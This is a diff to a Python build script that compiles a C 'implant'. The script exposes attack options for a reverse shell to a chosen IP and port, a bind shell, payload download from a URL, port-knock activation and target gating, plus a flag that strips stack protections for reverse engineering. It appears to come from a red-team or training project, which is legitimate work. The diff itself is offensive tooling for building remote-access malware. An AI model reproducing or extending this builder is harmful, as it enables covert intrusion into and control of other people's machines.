@@ -23,7 +23,7 @@ implant_c_path = "main.c"
 # Available implant compiler choices
 # TODO: Update this line in argparser to match the currently available options
 parser = argparse.ArgumentParser(
-    "python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip] [-]')
+    "python compiler.py", usage='%(prog)s [-o fileName] [-p ports to knock] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip] [-]')
 
 parser.add_argument("-o", "--outputName", type=str, metavar='',
                     help="output filename", default="implant")
@@ -39,6 +39,8 @@ parser.add_argument("-ip", "--ipAddress", type=str,
                     help="target address", metavar='', default="unknown")
 parser.add_argument("-do", "--domain", type=str,
                     help="target domain", metavar='', default="unknown")
+parser.add_argument("-p", "--portsToKnock", type=int,
+                    help="List of the ports to knock", nargs='+', default="unknown")
 
 ##### Guardrails #####
 parser.add_argument("-a", "--architecture", type=str, metavar='',
@@ -79,6 +81,8 @@ parser.add_argument("-d", "--debug", action="store_true",
                     help="compile with debugging")
 parser.add_argument("-vg", "--valgrind", action="store_true",
                     help="compile and then run the implant through valgrind")
+parser.add_argument("-hck", "--hackable", action="store_true", 
+                    help="compile for the RE team to do RE")
 
 # Parse the arguments for use in the log and elsewhere!
 args = parser.parse_args()
@@ -91,11 +95,11 @@ with open('log.csv', mode='a+') as log_file:
                                 quotechar='"', quoting=csv.QUOTE_MINIMAL)
         if (log_exists != 1):
                 fieldnamesList = ["datetime", "ipAddress",
-                                "tgtArch", "tgtOS", "outputName"]
+                                "tgtArch", "tgtOS", "outputName", "portsToKnock"]
                 log_writer.writerow(fieldnamesList)
 
         log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(
-                args.architecture), str(args.os), str(args.outputName)])
+                args.architecture), str(args.os), str(args.outputName), args.portsToKnock])
 
 
 # This is the gcc command framework that will be eventually executed to compile the implant
@@ -111,6 +115,8 @@ if not args.strip:
     cmdString.insert(1, "-s")
 if args.staticLink:
     cmdString.insert(1, "-static")
+if args.hackable:
+    cmdString.insert(1, "-no-pie -Wl,-z,norelro -fno-stack-protector")
 
 ##### Attacks #####
 if args.reverseIP != "unknown":
@@ -123,6 +129,8 @@ if args.downloadURL != "www.example.com":
     cmdString.insert(1, "-D URL=\"" + (args.downloadURL) + "\"")
 if args.bindShell != 999999:
     cmdString.insert(1, "-D BIND")
+if args.reverseShell:
+    cmdString.insert(1, "-D REVERSE")
 
 ##### Guardrails #####
 if args.architecture != "unknown":
@@ -153,9 +161,10 @@ cmdString.append("-lcurl")  # -lcurl is required to include the libcurl library
 cmdString.append("-lpcap")  
 
 print(cmdString)
+print(args.portsToKnock)
 
 # Execute the gcc string to compile the implant
-subprocess.run(cmdString)
+# subprocess.run(cmdString)
 
 # Run the new implant
 # FOR TESTING ONLY
